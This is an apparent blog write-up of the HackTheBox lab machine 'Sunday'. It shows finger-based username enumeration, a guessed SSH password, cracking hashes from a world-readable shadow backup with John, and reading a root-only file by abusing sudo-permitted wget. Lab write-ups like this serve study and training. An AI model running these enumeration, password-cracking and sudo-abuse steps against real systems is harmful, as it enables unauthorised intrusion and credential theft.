---
title:  "Hackthebox - Sunday"
date:   2018-09-30 16:30:18 +0200
categories: hackthebox
published: true
---

{% include image-center.html url="/assets/htb-sunday.png" alt="Info Card" %}

## user

In order to find out which ports are open, I used `nmap`. 

```bash
# Nmap 7.70 scan initiated Sun Sep 9 15:07:47 2018 as: nmap -sV -sC -oA sunday 10.10.10.76
Nmap scan report for 10.10.10.76
Host is up (0.038s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
79/tcp  open  finger  Sun Solaris fingerd
| finger: Login       Name               TTY         Idle    When    Where\x0D
| sunny    sunny                 pts/2          2 Sun 12:28  10.10.14.43         \x0D
| sunny    sunny                 pts/3          8 Sun 12:57  10.10.13.14         \x0D
|_sunny    sunny                 pts/4          8 Sun 12:36  10.10.13.14         \x0D
111/tcp open  rpcbind 2-4 (RPC #100000)
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 9 15:08:47 2018 -- 1 IP address (1 host up) scanned in 60.16 seconds
```

Two open ports were found: `finger` is running on TCP port 79 and `rpcbind` on TCP port 111.

RPC enumeration failed with an authentication error:

```bash
$ rpcinfo -p 10.10.10.76
10.10.10.76: RPC: Port mapper failure - Authentication error
$ showmount -e 10.10.10.76
clnt_create: RPC: Port mapper failure - Authentication error
```

It is possible to enumerate usernames when the default Solaris `finger` service is in use. 

The response to a `finger` query using an existing user name differs from the response to non-existing users:

```bash
$ finger root@10.10.10.76
Login       Name               TTY         Idle    When    Where
root     Super-User            pts/3        <Apr 24 10:37> sunday
$ finger asdf@10.10.10.76
Login       Name               TTY         Idle    When    Where
asdf                  ???
```

Brute-forcing usernames could be done with a self-written script, but it is more comfortable to use the existing Metasploit module for that purpose:

```bash
msf > use auxiliary/scanner/finger/finger_users
msf auxiliary(scanner/finger/finger_users) > show options

Module options (auxiliary/scanner/finger/finger_users):

   Name        Current Setting                                                Required  Description
   ----        ---------------                                                --------  -----------
   RHOSTS                                                                     yes       The target address range or CIDR identifier
   RPORT       79                                                             yes       The target port (TCP)
   THREADS     1                                                              yes       The number of concurrent threads
   USERS_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of default UNIX accounts.

msf auxiliary(scanner/finger/finger_users) > set RHOSTS 10.10.10.76
RHOSTS => 10.10.10.76
msf auxiliary(scanner/finger/finger_users) > run

[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sunny
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sammy
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: adm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: lp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: uucp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nuucp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: dladm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: listen
[+] 10.10.10.76:79        - 10.10.10.76:79 Users found: adm, dladm, listen, lp, nuucp, sammy, sunny, uucp
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Except of the standard users on UNIX systems, two usernames could be used for credential guessing: `sunny` and `sammy`. 

Every box on htb had an SSH port open, but no SSH port showed up in the `nmap` scan. Assuming that the SSH port is on a non-standard port, I re-did the scan including all TCP ports. The parameters `--min-rate` and `--max-retries` were used as advised in the [Sunday](https://forum.hackthebox.eu/discussion/703/hint-for-sunday/p2) thread from the HTB forums because scanning all ports took forever. The chosen settings ensure that `nmap` tries to send at least 100 packets per second. When increading the number of transmitted packets, `nmap` tries to keep the accuracy at the same level by increasing the number of retries, which were limited to 5 in order to make the scan terminate faster.

```bash
# Nmap 7.70 scan initiated Sun Sep 9 16:47:43 2018 as: nmap -p- -sV -sC --min-rate 1000 --max-retries 5 -oA sunday-allports 10.10.10.76
Warning: 10.10.10.76 giving up on port because retransmission cap hit (5).
Nmap scan report for 10.10.10.76
Host is up (0.031s latency).
Not shown: 52460 filtered ports, 13070 closed ports
PORT      STATE SERVICE   VERSION
79/tcp    open  finger    Sun Solaris fingerd
| finger: Login       Name               TTY         Idle    When    Where\x0D
| sunny    sunny                 pts/2          9 Sun 14:28  10.10.14.43         \x0D
| sunny    sunny                 pts/3          4 Sun 14:46  10.10.13.69         \x0D
|_sunny    sunny                 pts/4            Sun 14:36  10.10.13.14         \x0D
111/tcp   open  rpcbind   2-4 (RPC #100000)
22022/tcp open  ssh       SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
34313/tcp open  smserverd 1 (RPC #100155)
60406/tcp open  unknown
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 9 16:55:04 2018 -- 1 IP address (1 host up) scanned in 441.06 seconds
```

And indeed, there is an SSH server listening on Port 22022.

My kali first system refused to connect to the SSH server with the error message `Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1`. However, the legacy key exchange algorithm required by the server can be explicitly activated by using `-o KexAlgorithms=+diffie-hellman-group1-sha1`.

Before trying to crack the SSH login, I made some obvious guesses - and succeeded with the user name `sunny` and the password `sunday`. 

Great, I got SSH access to the box without too much effort. However, the `user.txt` file containing the flag was placed on the Desktop of the user `sammy` and `sunny` had no read permissions on that file:

```bash
sunny@sunday:~$ find / -name user.txt 2> /dev/null
/export/home/sammy/Desktop/user.txt
sunny@sunday:~$ stat /export/home/sammy/Desktop/user.txt 
  File: `/export/home/sammy/Desktop/user.txt'
  Size: 33              Blocks: 2          IO Block: 512    regular file
Device: 2d90008h/47775752d      Inode: 7           Links: 1
Access: (0400/-r--------)  Uid: (  101/   sammy)   Gid: (   10/   staff)
Access: 2018-09-09 13:12:08.053707365 +0530
Modify: 2018-04-15 20:37:36.951822952 +0530
Change: 2018-04-15 20:37:47.065051304 +0530
```

Somehow, I needed to escalate privileges to the user `sammy`.

I used [LinEnum](https://github.com/rebootuser/LinEnum) for scanning the box for possible attack vectors, but the script did not output interesting results.

However, when looking manually for interesting files, I found a folder named `backup` in the root directory of the box. This folder contained a file that looked like a backup of the `/etc/shadow` file. This file was owned by root but readable by everyone! The backup file contained hashes of passwords for sammy and sunny:

```bash
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Maybe it is possible to crack those hashes and get the password of `sammy`...

In order to crack those hashes with john, I got the entries for sammy and sunny from `/etc/passwd`, which is readable for everyone on UNIX systems by default.

```bash
sammy:x:101:10:sammy:/export/home/sammy:/bin/bash
sunny:x:65535:1:sunny:/export/home/sunny:/bin/bash
```

I merged those files using the `unshadow` tool: 

```bash
$ unshadow passwd.txt shadow.txt | tee hashes.txt
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:101:10:sammy:/export/home/sammy:/bin/bash
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:65535:1:sunny:/export/home/sunny:/bin/bash
```

Afterwards, I used [John the Ripper](https://www.openwall.com/john/) for cracking those hashes: 

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Warning: detected hash type "sha256crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
Press 'q' or Ctrl-C to abort, almost any other key for status
sunday           (sunny)
cooldude!        (sammy)
2g 0:00:03:24 DONE (2018-09-09 15:35) 0.009775g/s 995.9p/s 1008c/s 1008C/s coolster..chs2009
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The password worked for ssh login as sammy and I could finally read the `user.txt` file containing the flag. 

## root

Getting root was pretty straightforward. Sammy was allowed to run `wget` as root with sudo without providing a password:

```bash
sammy@sunday:~$ sudo -l 
User sammy may run the following commands on this host:
	(root) NOPASSWD: /usr/bin/wget
```

This means that it is probably just necessary to find a way how to make `wget` read the flag from the file `/root/root.txt`.

I consulted the man page of `wget` and found an interesting option: it is possible to read URLs from an input file. Maybe this option can be used for letting `wget` read the flag file...

```bash
sammy@sunday:~$ man wget
[snip]

 -i file
 --input-file=file
	 Read URLs from file.  If - is specified as file, URLs
	 are read from the standard input.  (Use ./- to read from
	 a file literally named -.)

	 If this function is used, no URLs need be present on the
	 command line.  If there are URLs both on the command
	 line and in an input file, those on the command lines
	 will be the first ones to be retrieved.  The file need
	 not be an HTML document (but no harm if it is)---it is
	 enough if the URLs are just listed sequentially.

	 However, if you specify --force-html, the document will
	 be regarded as html.  In that case you may have problems
	 with relative links, which you can solve either by
	 adding "<base href="url">" to the documents or by
	 specifying --base=url on the command line.

[snip]
```

I hoped that an error message will show the value of the URL, because the flag file does not contain a valid URL. And indeed, it worked:

```bash
sammy@sunday:~$ sudo wget -i /root/root.txt 
/root/root.txt: Invalid URL ****************************f9b8: Unsupported scheme
No URLs found in /root/root.txt.
```
